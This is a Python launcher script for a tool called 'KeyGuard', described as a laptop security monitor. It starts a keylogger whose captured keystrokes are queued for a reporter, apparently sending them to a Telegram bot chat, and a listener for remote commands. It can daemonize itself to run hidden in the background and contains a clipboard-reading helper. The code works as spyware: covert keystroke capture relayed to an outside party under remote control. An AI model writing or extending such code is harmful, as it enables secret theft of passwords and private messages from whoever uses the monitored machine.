import argparse
import os
import sys
import signal
import time
import subprocess
import threading

from config import BOT_TOKEN, CHAT_ID
from keylogger import Keylogger
from reporter import Reporter
from commands import CommandListener

PID_FILE = "/tmp/keyguard.pid"
LOG_FILE = "/tmp/keyguard.log"

reporter = None
keylogger = None
cmd_listener = None
stop_event = threading.Event()


def cleanup():
    global keylogger, reporter, cmd_listener
    if cmd_listener:
        cmd_listener.stop()
    if keylogger:
        keylogger.stop()
    if reporter:
        reporter.stop()


def signal_handler(signum, frame):
    cleanup()
    sys.exit(0)


def daemonize():
    pid = os.fork()
    if pid > 0:
        sys.exit(0)

    os.setsid()
    os.umask(0)

    pid = os.fork()
    if pid > 0:
        sys.exit(0)

    sys.stdout.flush()
    sys.stderr.flush()
    with open(LOG_FILE, "a") as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())

    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))


def check_config():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or CHAT_ID == "YOUR_CHAT_ID_HERE":
        print("[KeyGuard] ERROR: Configure BOT_TOKEN and CHAT_ID in config.py first")
        sys.exit(1)


def copy_to_clipboard():
    try:
        result = subprocess.run(
            ["xclip", "-o", "-selection", "clipboard"],
            capture_output=True, text=True, timeout=2
        )
        text = result.stdout.strip()
        if text:
            return text
    except:
        pass
    return None


def run_foreground():
    global keylogger, reporter, cmd_listener, stop_event
    check_config()

    print("[KeyGuard] Starting in foreground mode...")
    print("[KeyGuard] Press Ctrl+C to stop")

    reporter = Reporter(BOT_TOKEN, CHAT_ID)
    keylogger = Keylogger(reporter.queue)
    cmd_listener = CommandListener(BOT_TOKEN, CHAT_ID, reporter, stop_event)

    reporter.start()
    keylogger.start()
    cmd_listener.start()

    reporter.send_message("[KeyGuard] Monitoring started")

    try:
        while not stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[KeyGuard] Stopping...")
    finally:
        cleanup()
        reporter.send_message("[KeyGuard] Monitoring stopped")


def run_background():
    global keylogger, reporter, cmd_listener, stop_event
    check_config()

    print("[KeyGuard] Starting in background mode...")
    daemonize()

    signal.signal(signal.SIGTERM, signal_handler)

    reporter = Reporter(BOT_TOKEN, CHAT_ID)
    keylogger = Keylogger(reporter.queue)
    cmd_listener = CommandListener(BOT_TOKEN, CHAT_ID, reporter, stop_event)

    reporter.start()
    keylogger.start()
    cmd_listener.start()

    reporter.send_message("[KeyGuard] Monitoring started (background)")

    while not stop_event.is_set():
        time.sleep(1)

    cleanup()


def stop_daemon():
    try:
        with open(PID_FILE) as f:
            pid = int(f.read().strip())
        os.kill(pid, signal.SIGTERM)
        os.remove(PID_FILE)
        print(f"[KeyGuard] Daemon (PID: {pid}) stopped")
    except FileNotFoundError:
        print("[KeyGuard] No daemon running")
    except ProcessLookupError:
        os.remove(PID_FILE)
        print("[KeyGuard] Stale PID file cleaned up")


def check_status():
    try:
        with open(PID_FILE) as f:
            pid = int(f.read().strip())
        os.kill(pid, 0)
        print(f"[KeyGuard] Daemon is running (PID: {pid})")
    except FileNotFoundError:
        print("[KeyGuard] Daemon is not running")
    except ProcessLookupError:
        print("[KeyGuard] Daemon is not running (stale PID)")


def main():
    parser = argparse.ArgumentParser(description="KeyGuard - Laptop Security Monitor")
    parser.add_argument("--foreground", action="store_true", help="Run in terminal (foreground)")
    parser.add_argument("--background", action="store_true", help="Run as background daemon")
    parser.add_argument("--stop", action="store_true", help="Stop background daemon")
    parser.add_argument("--status", action="store_true", help="Check if daemon is running")

    args = parser.parse_args()

    if args.stop:
        stop_daemon()
    elif args.status:
        check_status()
    elif args.background:
        run_background()
    else:
        run_foreground()


if __name__ == "__main__":
    main()
